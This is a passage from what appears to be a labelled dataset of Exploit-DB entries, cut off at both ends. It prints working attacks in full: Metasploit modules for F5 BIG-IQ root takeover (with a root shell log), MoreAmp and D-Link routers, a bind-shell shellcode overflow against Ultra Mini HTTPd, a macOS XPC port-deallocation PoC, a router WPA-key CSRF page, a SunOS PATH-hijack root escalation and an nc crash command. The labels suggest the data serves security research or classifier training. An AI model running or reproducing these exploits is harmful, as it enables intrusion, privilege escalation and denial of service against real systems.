name=”:InternetGatewayDevice.LANDevice.1.WLANConfiguration.1.PreSharedKey.1.KeyPassphrase” value=”PSWDmatlo331#@!”> <input type=”text” name=”:InternetGatewayDevice.LANDevice.1.WLANConfiguration.1.X_TWSZ-COM_PSKExpression” value=”KeyPassphrase”> <input type=”submit” value=”Send”> </form> </body> </html>  Step 4: save this as Incorrect_Access_Control.html Step 5: Planting this malicious web page (Incorrect_Access_Control.html) that are likely to be visited by the victim’s (by social engineering) or any user connected in the Access Point (AP) will have to visit this page or any attacker’s connected in the AP will trigger this exploit. Step 6: After execution of above exploit, wireless security (WPA/WPA2) key will change!!  Note: This vulnerability allowing an attacker to reproduce without login.",Incorrect Access Control Control,1
33143,"F5 BIG-IQ 4.1.0.2013.0 - Privilege Escalation (Metasploit) ## # This module requires Metasploit: http//metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  require 'msf/core' require 'json'  class Metasploit3 < Msf::Exploit::Remote   Rank = ExcellentRanking    include Msf::Exploit::Remote::HttpClient   include Msf::Exploit::FileDropper    def initialize(info={})     super(update_info(info,       'Name'           => ""F5 BIG-IQ v4.1.0.2013.0 authenticated arbitrary user password change"",       'Description'    => %q{       F5 BIG-IQ v4.1.0.2013.0 is vulnerable to a privilege escalation attack which allows       an attacker to change the root users password. This module does just this, then SSH's in.       },       'License'        => MSF_LICENSE,       'Author'         =>         [           'Brandon Perry <bperry.volatile@gmail.com>'         ],       'References'     =>         [           ['URL', 'http://volatile-minds.blogspot.com/2014/05/f5-big-iq-v41020130-authenticated.html']         ],       'Platform'       => ['unix'],       'Arch'           => ARCH_CMD,       'Targets'        =>         [           ['BIG-IQ 4.1.0.2013.0', {}]         ],       'Privileged'     => true,       'DefaultOptions'  =>       {         'SSL' => true,         'ExitFunction' => ""none""       },       'Payload'        =>       {         'Compat' => {           'PayloadType'    => 'cmd_interact',           'ConnectionType' => 'find'         }       },       'DisclosureDate' => ""Sep 23 2013"",       'DefaultTarget'  => 0))        register_options(         [           Opt::RPORT(443),           OptString.new('TARGETURI', [true, 'The URI of the vulnerable instance', '/']),           OptString.new('USERNAME', [true, 'The user to authenticate as.', 'username']),           OptString.new('PASSWORD', [true, 'The password to authenticate with.', 'password']),           OptString.new('ADMINISTRATOR', [true, 'The administrator to spoof for privilege escalation', 'root']),           OptInt.new('SSH_TIMEOUT', [ false, 'Specify the maximum time to negotiate a SSH session', 30])         ], self.class)   end    def exploit     post = {       'username' => datastore['USERNAME'],       'passwd' => datastore['PASSWORD']     }      print_status(""Authenticating as "" + datastore['USERNAME'])      #Simple post to get us a cookie so we can change our password     res = send_request_cgi({       'method' => 'POST',       'uri' => '/ui/actions/logmein.html',       'vars_post' => post     })      if res.headers[""Location""] != ""/""       fail_with(""Authentication failed"")     end      cookie = res.get_cookies      #this gets turned into JSON     #     #generation will be set in try_generation if it isn't correct     #     #This is also the attempt at privilege escalation, so we preserve the password     post = {       ""name"" => datastore['ADMINISTRATOR'],       ""displayName"" => ""fdsa"",       ""generation"" => 1,       ""lastUpdateMicros"" => 1395360806678747,       ""kind"" => ""shared:authz:users:usersworkerstate"",       ""selfLink"" => ""https://localhost/mgmt/shared/authz/users/"" + datastore['USERNAME'],       ""password"" => datastore['PASSWORD'],       ""password2"" => datastore['PASSWORD'],       ""state"" => ""ACTIVE""     }      print_status(""Escalating privileges to that of "" + datastore[""ADMINISTRATOR""])      try_generation(post, cookie, '/mgmt/shared/authz/users/' + datastore['USERNAME'])      password = Rex::Text.rand_text_alpha(rand(32)+5)      #this is when we change the password for the root user     post = {       ""name"" => ""root"",       ""displayName"" => ""root"",       ""generation"" => 1,       ""lastUpdateMicros"" => 1395359570236413,       ""kind"" => ""shared:authz:users:usersworkerstate"",       ""selfLink"" => ""https://localhost/mgmt/shared/authz/users/root"",       ""password"" => password,       ""password2"" => password,       ""state"" => ""ACTIVE""     }      select(nil,nil,nil,5)     print_status(""Changing root user password to "" + password)      try_generation(post, cookie, '/mgmt/shared/authz/users/root')      res = do_login('root', password)      if res       print_good(""Login Successful with 'root:#{password}'"")       handler(res.lsock)     end   end    def try_generation(put, cookie, uri)     done = false     while !done       res = send_request_cgi({         'method' => ""PUT"",         'uri' => uri,         'data' => put.to_json,         'cookie' => cookie       })        if res and res.body =~ /Invalid generation/         put['generation'] = /Need (\d{1,9}), received \d{1,9}/.match(res.body)[1]       elsif res and res.body =~ /encryptedPassword/         done = true       else         fail_with(""Didn't get a response that I expected"")       end     end   end     def do_login(user, pass)        opts = {         :auth_methods => ['password', 'keyboard-interactive'],         :msframework  => framework,         :msfmodule    => self,         :port         => 22,         :disable_agent => true,         :config => true,         :password => pass,         :record_auth_info => true,         :proxies => datastore['Proxies']       }        opts.merge!(:verbose => :debug) if datastore['SSH_DEBUG']        begin         ssh = nil         ssh = Net::SSH.start(datastore['RHOST'], user, opts)       rescue Rex::ConnectionError, Rex::AddressInUse         return nil       rescue Net::SSH::Disconnect, ::EOFError         print_error ""#{rhost}:#{rport} SSH - Disconnected during negotiation""         return nil       rescue ::Timeout::Error         print_error ""#{rhost}:#{rport} SSH - Timed out during negotiation""         return nil       rescue Net::SSH::AuthenticationFailed         print_error ""#{rhost}:#{rport} SSH - Failed authentication""         return nil       rescue Net::SSH::Exception => e         print_error ""#{rhost}:#{rport} SSH Error: #{e.class} : #{e.message}""         return nil       end       if ssh         conn = Net::SSH::CommandStream.new(ssh, '/bin/sh', true)         return conn       end       return nil     end end   __END__  msf exploit(f5_bigiq_passwd_update) > show options  Module options (exploit/linux/http/f5_bigiq_passwd_update):  Name           Current Setting  Required  Description ----           ---------------  --------  ----------- ADMINISTRATOR  root             yes       The administrator to spoof for privilege escalation PASSWORD       notpassword      yes       The password to authenticate with. Proxies                         no        Use a proxy chain RHOST          192.168.1.8      yes       The target address RPORT          443              yes       The target port SSH_TIMEOUT    30               no        Specify the maximum time to negotiate a SSH session TARGETURI      /                yes       The URI of the vulnerable instance USERNAME       username         yes       The user to authenticate as. VHOST                           no        HTTP server virtual host   Payload options (cmd/unix/interact):  Name  Current Setting  Required  Description  ----  ---------------  --------  -----------  Exploit target:  Id  Name --  ---- 0   a   msf exploit(f5_bigiq_passwd_update) > exploit  [+] Login Successful with 'root:qBvBY' [*] Found shell. [*] Command shell session 3 opened (192.168.1.31:58165 -> 192.168.1.8:22) at 2014-03-20 21:18:09 -0500  id uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel) context=root:system_r:unconfined_t:SystemLow-SystemHigh",Privilege Escalation,1
18601,"EMC NetWorker 7.6 sp3 - Denial of Service #######################################################################                               Luigi Auriemma  Application:  EMC NetWorker (Legato)               http://www.emc.com/backup-and-recovery/networker/networker.htm Versions:     <= 7.6 sp3 (7.6.3.2 Build 860) Platforms:    AIX, HP-UX, Linux, Solaris, Windows Bug:          invalid read access Exploitation: remote Date:         14 Mar 2012 Author:       Luigi Auriemma               e-mail: aluigi@autistici.org               web:    aluigi.org   #######################################################################   1) Introduction 2) Bug 3) The Code 4) Fix   #######################################################################  =============== 1) Introduction ===============   From vendor's homepage: ""EMC NetWorker backup and recovery software centralizes, automates, and accelerates data backup and recovery across your IT environment. NetWorker delivers record-breaking performance and a wide range of data protection options to safeguard your critical business data.""   #######################################################################  ====== 2) Bug ======   nsrexecd is a service listening on some default ports (like 111, 7937 and 7938) plus another couple of random ones usually over port 8000.  Through a malformed RPC packet sent to one these random ports it's possible to crash the service due to the hash calculation performed over an arbitrary amount of data.  From librpc.dll:    0038B3CF   8B4424 3C        MOV EAX,DWORD PTR SS:[ESP+3C]     ; my_size   0038B3D3   8B6D 00          MOV EBP,DWORD PTR SS:[EBP]   0038B3D6   2BF0             SUB ESI,EAX   0038B3D8   897424 38        MOV DWORD PTR SS:[ESP+38],ESI   0038B3DC   8B33             MOV ESI,DWORD PTR DS:[EBX]        ; size   0038B3DE   8B9C24 90000000  MOV EBX,DWORD PTR SS:[ESP+90]   0038B3E5   2BF0             SUB ESI,EAX                       ; size - my_size   0038B3E7   8B43 10          MOV EAX,DWORD PTR DS:[EBX+10]   0038B3EA   50               PUSH EAX   0038B3EB   8D4C24 3C        LEA ECX,DWORD PTR SS:[ESP+3C]   0038B3EF   51               PUSH ECX   0038B3F0   8D5424 48        LEA EDX,DWORD PTR SS:[ESP+48]   0038B3F4   52               PUSH EDX   0038B3F5   2BF7             SUB ESI,EDI   0038B3F7   53               PUSH EBX   0038B3F8   897424 54        MOV DWORD PTR SS:[ESP+54],ESI     ; the new size   0038B3FC   896C24 50        MOV DWORD PTR SS:[ESP+50],EBP   ...   0038AFC5   8D4C24 0C        LEA ECX,DWORD PTR SS:[ESP+C]   0038AFC9   51               PUSH ECX   0038AFCA   8B4C24 1C        MOV ECX,DWORD PTR SS:[ESP+1C]   0038AFCE   8D5424 0C        LEA EDX,DWORD PTR SS:[ESP+C]   0038AFD2   52               PUSH EDX   0038AFD3   8B51 04          MOV EDX,DWORD PTR DS:[ECX+4]      ; new size   0038AFD6   8B09             MOV ECX,DWORD PTR DS:[ECX]   0038AFD8   52               PUSH EDX   0038AFD9   8B5424 2C        MOV EDX,DWORD PTR SS:[ESP+2C]   0038AFDD   51               PUSH ECX   0038AFDE   8B48 20          MOV ECX,DWORD PTR DS:[EAX+20]   0038AFE1   52               PUSH EDX   0038AFE2   8B50 1C          MOV EDX,DWORD PTR DS:[EAX+1C]   0038AFE5   51               PUSH ECX   0038AFE6   52               PUSH EDX   0038AFE7   E8 04E3FFFF      CALL LIBRPC.cryptoiface_get_hmac  ; hash crash  Note: after the crash it's necessary to restart also the other services so that the situation can return normal and the bug can be tested again.   #######################################################################  =========== 3) The Code ===========   http://aluigi.org/poc/nsrexecd_1.dat https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/18601.dat    nc SERVER PORT < nsrexecd_1.dat  it's enough to scan all the ports from 8000 to 10000 to catch the correct one automatically.   #######################################################################  ====== 4) Fix ======   No fix.   #######################################################################",Denial of Service,1
26739,"Ultra Mini HTTPd 1.21 - Remote Stack Buffer Overflow # Exploit Title: Ultra Mini HTTPD stack buffer overflow # Date: 10 July 2013 # Exploit Author: superkojiman - http://www.techorganic.com # Vendor Homepage: http://www.picolix.jp/ # Software Link: http://www.vector.co.jp/soft/winnt/net/se275154.html # Version: 1.21 # Tested on: Windows XP Professional SP2, English # # Description:  # A buffer overflow is triggered when requesting a very long  # resource name.  #  import socket import struct  # msfpayload windows/shell_bind_tcp R | \ #     msfencode -b ""\x00\x0a\x0d\x20\x0b\x09\x0c"" # [*] x86/shikata_ga_nai succeeded with size 368 (iteration=1)  shellcode = (  ""\xba\x1f\xb5\xae\xa1\xdd\xc4\xd9\x74\x24\xf4\x5e\x33\xc9"" + ""\xb1\x56\x31\x56\x13\x83\xc6\x04\x03\x56\x10\x57\x5b\x5d"" + ""\xc6\x1e\xa4\x9e\x16\x41\x2c\x7b\x27\x53\x4a\x0f\x15\x63"" + ""\x18\x5d\x95\x08\x4c\x76\x2e\x7c\x59\x79\x87\xcb\xbf\xb4"" + ""\x18\xfa\x7f\x1a\xda\x9c\x03\x61\x0e\x7f\x3d\xaa\x43\x7e"" + ""\x7a\xd7\xab\xd2\xd3\x93\x19\xc3\x50\xe1\xa1\xe2\xb6\x6d"" + ""\x99\x9c\xb3\xb2\x6d\x17\xbd\xe2\xdd\x2c\xf5\x1a\x56\x6a"" + ""\x26\x1a\xbb\x68\x1a\x55\xb0\x5b\xe8\x64\x10\x92\x11\x57"" + ""\x5c\x79\x2c\x57\x51\x83\x68\x50\x89\xf6\x82\xa2\x34\x01"" + ""\x51\xd8\xe2\x84\x44\x7a\x61\x3e\xad\x7a\xa6\xd9\x26\x70"" + ""\x03\xad\x61\x95\x92\x62\x1a\xa1\x1f\x85\xcd\x23\x5b\xa2"" + ""\xc9\x68\x38\xcb\x48\xd5\xef\xf4\x8b\xb1\x50\x51\xc7\x50"" + ""\x85\xe3\x8a\x3c\x6a\xde\x34\xbd\xe4\x69\x46\x8f\xab\xc1"" + ""\xc0\xa3\x24\xcc\x17\xc3\x1f\xa8\x88\x3a\x9f\xc9\x81\xf8"" + ""\xcb\x99\xb9\x29\x73\x72\x3a\xd5\xa6\xd5\x6a\x79\x18\x96"" + ""\xda\x39\xc8\x7e\x31\xb6\x37\x9e\x3a\x1c\x4e\x98\xf4\x44"" + ""\x03\x4f\xf5\x7a\xb2\xd3\x70\x9c\xde\xfb\xd4\x36\x76\x3e"" + ""\x03\x8f\xe1\x41\x61\xa3\xba\xd5\x3d\xad\x7c\xd9\xbd\xfb"" + ""\x2f\x76\x15\x6c\xbb\x94\xa2\x8d\xbc\xb0\x82\xc4\x85\x53"" + ""\x58\xb9\x44\xc5\x5d\x90\x3e\x66\xcf\x7f\xbe\xe1\xec\xd7"" + ""\xe9\xa6\xc3\x21\x7f\x5b\x7d\x98\x9d\xa6\x1b\xe3\x25\x7d"" + ""\xd8\xea\xa4\xf0\x64\xc9\xb6\xcc\x65\x55\xe2\x80\x33\x03"" + ""\x5c\x67\xea\xe5\x36\x31\x41\xac\xde\xc4\xa9\x6f\x98\xc8"" + ""\xe7\x19\x44\x78\x5e\x5c\x7b\xb5\x36\x68\x04\xab\xa6\x97"" + ""\xdf\x6f\xd6\xdd\x7d\xd9\x7f\xb8\x14\x5b\xe2\x3b\xc3\x98"" + ""\x1b\xb8\xe1\x60\xd8\xa0\x80\x65\xa4\x66\x79\x14\xb5\x02"" + ""\x7d\x8b\xb6\x06"" )  # 7C941EED  , JMP ESP , ntdll.dll payload =  ""A"" * 5392 + struct.pack(""<I"", 0x7C941EED) payload += ""\x81\xc4\xf0\xea\xff\xff"" + shellcode + ""B"" * 4230  print ""[+] sending payload, length"", len(payload)  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((""192.168.37.175"", 80))  buf = ( 	""GET /"" + payload + "" HTTP/1.1\r\n"" +  	""Host: 192.168.37.175"" +  	""\r\n\r\n"" )  s.send(buf) s.close()",Remote Stack Buffer Overflow,1
25530,"OneWorldStore - IDOrder Information Disclosure source: https://www.securityfocus.com/bid/13361/info  OneWorldStore is prone to an information disclosure vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input.  Exploitation of this vulnerability would expose the customer names, as they appear on credit cards, and their addresses to the attacker.   http://www.example.com/owBasket/PaymentMethods/owOfflineCC.asp?idOrder=1 http://www.example.com/owBasket/PaymentMethods/owOfflineCC.asp?idOrder=2 http://www.example.com/owBasket/PaymentMethods/owOfflineCC.asp?idOrder=3 http://www.example.com/owBasket/PaymentMethods/owOfflineCC.asp?idOrder=",IDOrder Information Disclosure,1
46297,"macOS < 10.14.3 / iOS < 12.1.3 - Arbitrary mach Port Name Deallocation in XPC Services due to Invalid mach Message Parsing in _xpc_serializer_unpack /* _xpc_serializer_unpack in libxpc parses mach messages which contain xpc messages.  There are two reasons for an xpc mach message to contain descriptors: if the message body is large, then it's sent as a MACH_MSG_OOL_DESCRIPTOR. Also if the message contains other port resources (eg memory entry ports) then they're also transfered as MACH_PORT_OOL_PORT descriptors.  Whilst looking through a dump of system mach message traffic gathered via a dtrace script I noticed something odd: It's possible for a message to have the MACH_MSGH_BITS_COMPLEX bit set and also have a msgh_descriptor_count of 0.  Looking at ipc_kmsg_copyin_body you can see that this is in fact the case.  This is a kinda surprising fact, and I think there are likely to be multiple places where developers are going to have assumed that there must be at least one descriptor if MACH_MSGH_BITS_COMPLEX is set.  It turns out that libxpc does exactly that in _xpc_serializer_unpack:  __text:0000000000007016                 cmp     dword ptr [rbx], 0        ; rbx points to the start of the mach message __text:0000000000007019                 js      short loc_703F            ; branch if the COMPLEX bit is set ... __text:000000000000703F loc_703F:                               ; CODE XREF: __xpc_serializer_unpack+67↑j __text:000000000000703F                 mov     rax, rbx __text:0000000000007042                 mov     edx, [rax+18h]            ; read msgh_descriptor_count, which could be 0 __text:0000000000007045                 add     rbx, 1Ch                  ; point rbx to the first descriptor __text:0000000000007049                 mov     ecx, 0FF000000h __text:000000000000704E                 and     ecx, [rax+24h] __text:0000000000007051                 cmp     ecx, 1000000h             ; is the type OOL_DESC? __text:0000000000007057                 jnz     short loc_7089 __text:0000000000007059                 or      byte ptr [r12+0ACh], 4    ; yes, then set this bit __text:0000000000007062                 mov     r9, [rbx]                 ; save the address field __text:0000000000007065                 mov     r15d, [rbx+0Ch]           ; and size field for later __text:0000000000007069                 lea     rax, __xpc_serializer_munmap __text:0000000000007070                 mov     [r12+48h], rax __text:0000000000007075                 dec     edx                       ; decrement msgh_descriptor_count, so could now be 0xffffffff __text:0000000000007077                 mov     dword ptr [rbx+0Ch], 0    ; clear the size in the message __text:000000000000707E                 lea     rbx, [rbx+10h]            ; skip over this desc __text:0000000000007082                 mov     eax, 2Ch ; ',' __text:0000000000007087                 jmp     short loc_7094 __text:0000000000007094                 test    edx, edx                  ; test whether msgh_descriptor_count is now 0 __text:0000000000007096                 jz      loc_713E                  ; but we've decremented it to 0xffffffff :)  The code the goes on to read up to 0xffffffff port descriptors, storing the names and dispositions in two arrays.  By specifying an invalid disposition we can stop the loop, the serializer will then return an error and be destructed which will cause names read from our fake descriptors to be passed to mach_port_deallocate().  You can test this PoC by attached lldb to the chosen target, setting a breakpoint on mach_port_deallocate and waiting for the port name 0x414141 to be passed in rsi.  There is one mitigating factor which might prevent this from being exploitable on iOS: the underflowed value is used for two memory allocations so you need to be able to reserve around 32G of RAM, on MacOS this is no problem but doesn't seem to be so easy on my XS.  Still, it would be a nice sandbox escape on MacOS.  Tested on MacOS 10.14.1 (18B75) */  // ianbeer #if 0 Arbitrary mach port name deallocation in XPC services due to invalid mach message parsing in _xpc_serializer_unpack  _xpc_serializer_unpack in libxpc parses mach messages which contain xpc messages.  There are two reasons for an xpc mach message to contain descriptors: if the message body is large, then it's sent as a MACH_MSG_OOL_DESCRIPTOR. Also if the message contains other port resources (eg memory entry ports) then they're also transfered as MACH_PORT_OOL_PORT descriptors.  Whilst looking through a dump of system mach message traffic gathered via a dtrace script I noticed something odd: It's possible for a message to have the MACH_MSGH_BITS_COMPLEX bit set and also have a msgh_descriptor_count of 0.  Looking at ipc_kmsg_copyin_body you can see that this is in fact the case.  This is a kinda surprising fact, and I think there are likely to be multiple places where developers are going to have assumed that there must be at least one descriptor if MACH_MSGH_BITS_COMPLEX is set.  It turns out that libxpc does exactly that in _xpc_serializer_unpack:  __text:0000000000007016                 cmp     dword ptr [rbx], 0        ; rbx points to the start of the mach message __text:0000000000007019                 js      short loc_703F            ; branch if the COMPLEX bit is set ... __text:000000000000703F loc_703F:                               ; CODE XREF: __xpc_serializer_unpack+67↑j __text:000000000000703F                 mov     rax, rbx __text:0000000000007042                 mov     edx, [rax+18h]            ; read msgh_descriptor_count, which could be 0 __text:0000000000007045                 add     rbx, 1Ch                  ; point rbx to the first descriptor __text:0000000000007049                 mov     ecx, 0FF000000h __text:000000000000704E                 and     ecx, [rax+24h] __text:0000000000007051                 cmp     ecx, 1000000h             ; is the type OOL_DESC? __text:0000000000007057                 jnz     short loc_7089 __text:0000000000007059                 or      byte ptr [r12+0ACh], 4    ; yes, then set this bit __text:0000000000007062                 mov     r9, [rbx]                 ; save the address field __text:0000000000007065                 mov     r15d, [rbx+0Ch]           ; and size field for later __text:0000000000007069                 lea     rax, __xpc_serializer_munmap __text:0000000000007070                 mov     [r12+48h], rax __text:0000000000007075                 dec     edx                       ; decrement msgh_descriptor_count, so could now be 0xffffffff __text:0000000000007077                 mov     dword ptr [rbx+0Ch], 0    ; clear the size in the message __text:000000000000707E                 lea     rbx, [rbx+10h]            ; skip over this desc __text:0000000000007082                 mov     eax, 2Ch ; ',' __text:0000000000007087                 jmp     short loc_7094 __text:0000000000007094                 test    edx, edx                  ; test whether msgh_descriptor_count is now 0 __text:0000000000007096                 jz      loc_713E                  ; but we've decremented it to 0xffffffff :)  The code the goes on to read up to 0xffffffff port descriptors, storing the names and dispositions in two arrays.  By specifying an invalid disposition we can stop the loop, the serializer will then return an error and be destructed which will cause names read from our fake descriptors to be passed to mach_port_deallocate().  You can test this PoC by attached lldb to the chosen target, setting a breakpoint on mach_port_deallocate and waiting for the port name 0x414141 to be passed in rsi.  There is one mitigating factor which might prevent this from being exploitable on iOS: the underflowed value is used for two memory allocations so you need to be able to reserve around 32G of RAM, on MacOS this is no problem but doesn't seem to be so easy on my XS.  Still, it would be a nice sandbox escape on MacOS.  Tested on MacOS 10.14.1 (18B75)  #endif  #include <stdio.h> #include <stdlib.h>  #include <mach/mach.h>  kern_return_t bootstrap_look_up(mach_port_t bp, const char* service_name, mach_port_t *sp);  struct xpc_w00t {   mach_msg_header_t hdr;   mach_msg_body_t body;   mach_msg_port_descriptor_t client_port;   mach_msg_port_descriptor_t reply_port; };  static int xpc_checkin(   mach_port_t service_port,   mach_port_t* client_port,   mach_port_t* reply_port) {   // allocate the client and reply port:   kern_return_t err;   err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, client_port);   if (err != KERN_SUCCESS) {     printf(""port allocation failed: %s\n"", mach_error_string(err));     exit(EXIT_FAILURE);   }    // insert a send so we maintain the ability to send to this port   err = mach_port_insert_right(mach_task_self(), *client_port, *client_port, MACH_MSG_TYPE_MAKE_SEND);   if (err != KERN_SUCCESS) {     printf(""port right insertion failed: %s\n"", mach_error_string(err));     exit(EXIT_FAILURE);   }    err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, reply_port);   if (err != KERN_SUCCESS) {     printf(""port allocation failed: %s\n"", mach_error_string(err));     exit(EXIT_FAILURE);   }    struct xpc_w00t msg;   memset(&msg.hdr, 0, sizeof(msg));   msg.hdr.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND, 0, 0, MACH_MSGH_BITS_COMPLEX);   msg.hdr.msgh_size = sizeof(msg);   msg.hdr.msgh_remote_port = service_port;   msg.hdr.msgh_id   = 'w00t';      msg.body.msgh_descriptor_count = 2;    msg.client_port.name        = *client_port;   msg.client_port.disposition = MACH_MSG_TYPE_MOVE_RECEIVE; // we still keep the send   msg.client_port.type        = MACH_MSG_PORT_DESCRIPTOR;    msg.reply_port.name        = *reply_port;   msg.reply_port.disposition = MACH_MSG_TYPE_MAKE_SEND;   msg.reply_port.type        = MACH_MSG_PORT_DESCRIPTOR;      err = mach_msg(&msg.hdr,                  MACH_SEND_MSG|MACH_MSG_OPTION_NONE,                  msg.hdr.msgh_size,                  0,                  MACH_PORT_NULL,                  MACH_MSG_TIMEOUT_NONE,                  MACH_PORT_NULL);   if (err != KERN_SUCCESS) {     printf(""w00t message send failed: %s\n"", mach_error_string(err));     exit(EXIT_FAILURE);   } else {     printf(""sent xpc w00t message\n"");   }    return 1; }  struct xpc_bad_ool {   mach_msg_header_t hdr;   mach_msg_body_t body;   mach_msg_ool_descriptor_t ool0;   mach_msg_port_descriptor_t port1;   mach_msg_ool_descriptor_t ool2; };   void bad_xpc(mach_port_t p) {   kern_return_t err;   struct xpc_bad_ool msg = {0};    msg.hdr.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND, 0, 0, MACH_MSGH_BITS_COMPLEX);   msg.hdr.msgh_size = sizeof(msg);   msg.hdr.msgh_remote_port = p;   msg.hdr.msgh_id   = 0x10000000;      msg.body.msgh_descriptor_count = 0;    msg.ool0.address = 0x414141414141;   msg.ool0.size = 0x4000;   msg.ool0.type = MACH_MSG_OOL_DESCRIPTOR;      msg.port1.name = 0x41414141;  // port name to mach_port_deallocate in target   msg.port1.disposition = 0x11;   msg.port1.type = MACH_MSG_PORT_DESCRIPTOR;      msg.ool2.address = 0x414141414141;   msg.ool2.size = 0x4000;   msg.ool2.type = MACH_MSG_OOL_DESCRIPTOR;       err = mach_msg(&msg.hdr,                  MACH_SEND_MSG|MACH_MSG_OPTION_NONE,                  msg.hdr.msgh_size,                  0,                  MACH_PORT_NULL,                  MACH_MSG_TIMEOUT_NONE,                  MACH_PORT_NULL);   if (err != KERN_SUCCESS) {     printf(""xpc message send failed: %s\n"", mach_error_string(err));     exit(EXIT_FAILURE);   } else {     printf(""sent xpc message\n"");   }  }  // lookup a launchd service: static mach_port_t lookup(   char* name) {   mach_port_t service_port = MACH_PORT_NULL;   kern_return_t err = bootstrap_look_up(bootstrap_port, name, &service_port);   if(err != KERN_SUCCESS){     printf(""unable to look up %s\n"", name);     return MACH_PORT_NULL;   }      if (service_port == MACH_PORT_NULL) {     printf(""bad service port\n"");     return MACH_PORT_NULL;   }   return service_port; }  void xpc_connect(   char* service_name,   mach_port_t* xpc_client_port,   mach_port_t* xpc_reply_port) {   mach_port_t service_port = lookup(service_name);   xpc_checkin(service_port, xpc_client_port, xpc_reply_port);   mach_port_destroy(mach_task_self(), service_port); }  int main() {   mach_port_t service_port = lookup(""com.apple.nsurlsessiond"");    mach_port_t xpc_client_port = MACH_PORT_NULL;   mach_port_t xpc_reply_port  = MACH_PORT_NULL;    xpc_checkin(service_port, &xpc_client_port, &xpc_reply_port);   printf(""xpc_client_port: %x\n"", xpc_client_port);   printf(""checked in?\n"");    bad_xpc(xpc_client_port);    return 0; }",Arbitrary mach Port Name Deallocation,1
19043,"SunOS 4.1.1 - '/usr/release/bin/winstall' Local Privilege Escalation source: https://www.securityfocus.com/bid/22/info  This applies to sites that have installed Sun Source tapes only.  The Sun distribution of sources (sunsrc) has an installation procedure which creates the directory /usr/release/bin and installs two setuid root files in it: makeinstall and winstall. These are both binary files which exec other programs: ""make -k install"" (makeinstall) or ""install"" (winstall) without a full path or reseting the PATH enviroment variable.  This makes it possible for users on that system to become root.  $ cp /bin/sh /tmp/sh $ echo chmod 4777 /tmp/sh > /tmp/install $ chmod a+rx /tmp/install $ set PATH=/tmp:$PATH $ export PATH $ /usr/bin/winstall $ /tmp/sh #",Local Privilege Escalation,1
14397,"MoreAmp - Local Buffer Overflow (SEH) (Metasploit) #MoreAmp Seh Buffer Overflow (meta) #Greetz:His0k4 , Bibi-info , Volc4n0 #sec4ever.com require 'msf/core'   class Metasploit3 < Msf::Exploit::Remote     Rank = NormalRanking       include Msf::Exploit::FILEFORMAT     include Msf::Exploit::Remote::Seh       def initialize(info = {})         super(update_info(info,             'Name' => 'MoreAmp 0.1.25 Beta Buffer Overflow (SEH)',             'Description' => %q{                 This module exploits a SEH overflow in 0.1.25 MoreAmp Beta             By creating a specially crafted .m3u file, an an attacker may be able             to execute arbitrary code.             },             'License' => MSF_LICENSE,             'Author' => 'MadjiX',             'Version' => 'Version 1',             'References' =>                 [                     [ 'OSVDB', '65789' ],                     [ 'URL', 'http://www.exploit-db.com/exploits/13942/' ],                 ],             'DefaultOptions' =>                 {                     'EXITFUNC' => 'process',                 },             'Payload' =>                 {                     'Space' => 1400,                     'BadChars' => ""\x00\x20\x0a\x0d"",                     'StackAdjustment' => -3500,                 },             'Platform' => 'win',             'Targets' =>                 [                     [ 'Windows XP SP3 Fr', { 'Ret' => 0x7C86467B} ], # 0x7C86467B jmp esp kernel.32                   ],             'Privileged' => false,             'DisclosureDate'  => '17-07-2010',             'DefaultTarget' => 0))           register_options(             [                 OptString.new('FILENAME', [ false, 'The file name.', 'MadjiX.maf']),             ], self.class)     end         def exploit           sploit = rand_text_alphanumeric(108)         sploit << ""\xeb\x06\x90\x90""         sploit << [target.ret].pack('V')         sploit << payload.encoded         sploit << rand_text_alphanumeric(400 - payload.encoded.length)           maffile = sploit         print_status(""Creating '#{datastore['FILENAME']}' file ..."")         file_create(maffile)       end   end",Local Buffer Overflow,1
24956,"D-Link DIR-645 / DIR-815 - 'diagnostic.php' Command Execution (Metasploit) ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # web site for more information on licensing and terms of use. #   http://metasploit.com/ ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote   Rank = ExcellentRanking    include Msf::Exploit::Remote::HttpClient   include Msf::Exploit::Remote::HttpServer   include Msf::Exploit::EXE   include Msf::Exploit::FileDropper    def initialize(info = {})     super(update_info(info,       'Name'        => 'DLink DIR-645 / DIR-815 diagnostic.php Command Execution',       'Description' => %q{           Some DLink Routers are vulnerable to OS Command injection in the web interface.         On DIR-645 versions prior 1.03 authentication isn't needed to exploit it. On         version 1.03 authentication is needed in order to trigger the vulnerability, which         has been fixed definitely on version 1.04. Other DLink products, like DIR-300 rev B         and DIR-600, are also affected by this vulnerability. Not every device includes         wget which we need for deploying our payload. On such devices you could use the cmd         generic payload and try to start telnetd or execute other commands. Since it is a         blind os command injection vulnerability, there is no output for the executed         command when using the cmd generic payload. A ping command against a controlled         system could be used for testing purposes. This module has been tested successfully         on DIR-645 prior to 1.03, where authentication isn't needed in order to exploit the         vulnerability.       },       'Author'      =>         [           'Michael Messner <devnull@s3cur1ty.de>', # Vulnerability discovery and Metasploit module           'juan vazquez' # minor help with msf module         ],       'License'     => MSF_LICENSE,       'References'  =>         [           [ 'OSVDB', '92144' ],           [ 'BID', '58938' ],           [ 'EDB', '24926' ],           [ 'URL', 'http://www.s3cur1ty.de/m1adv2013-017' ]         ],       'DisclosureDate' => 'Mar 05 2013',       'Privileged'     => true,       'Platform'       => ['linux','unix'],       'Payload'        =>         {           'DisableNops' => true         },       'Targets'        =>         [           [ 'CMD',             {             'Arch' => ARCH_CMD,             'Platform' => 'unix'             }           ],           [ 'Linux mipsel Payload',             {             'Arch' => ARCH_MIPSLE,             'Platform' => 'linux'             }           ],         ],       'DefaultTarget'  => 1       ))      register_options(       [         OptAddress.new('DOWNHOST', [ false, 'An alternative host to request the MIPS payload from' ]),         OptString.new('DOWNFILE', [ false, 'Filename to download, (default: random)' ]),         OptInt.new('HTTP_DELAY', [true, 'Time that the HTTP Server will 